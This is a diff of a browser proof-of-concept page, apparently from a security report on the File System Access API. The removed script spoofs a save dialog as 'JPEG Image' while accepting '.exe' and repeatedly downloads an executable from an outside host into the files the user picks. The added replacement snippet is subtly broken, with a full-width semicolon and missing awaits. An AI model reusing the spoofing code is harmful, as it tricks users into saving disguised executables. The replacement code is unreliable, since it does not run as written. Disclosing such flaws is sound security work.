@@ -15,36 +15,16 @@
     <h3>Code example/proof:</h3>
     <div style="display: flex; flex-direction: column">
         <div>
-            <button id="addNewFile" style="font-size: 26px; margin-top: 10px;">Save image</button>
+            <button id="createNewFile" style="font-size: 26px; margin-top: 10px;">create file</button>
         </div>
 
     </div>
     <script>
-
-        const butSaveNewFile = document.getElementById('addNewFile')
-        butSaveNewFile.addEventListener('mouseup', async () => {
-            const options = {
-                types: [
-                    {
-                        description:
-                            'JPEG Image (*.jpeg)',
-                        accept: {
-                            'text/plain': ['.exe']
-                        },
-                        content: 'testetsteste'
-                    }
-                ]
-            }
-            debugger;
-            
-            for (let i = 0; i < 0x100; i++) {
-            const handle = await window.showSaveFilePicker(options)
-            const writable = await handle.createWritable()
-            const response = await fetch('https://nfz.dev/putty.exe');
-            await response.body.pipeTo(writable);
-            alert('File saved')
-            }
-        })
+        const createNewFile = document.getElementById('createNewFile')；
+        createNewFile.onclick=function(){
+        const directoryHandle = window.showDirectoryPicker();
+        const newFileHandle =  directoryHandle.getFileHandle('My Notes.txt', { create: true });
+        }
     </script>
     <hr>
 
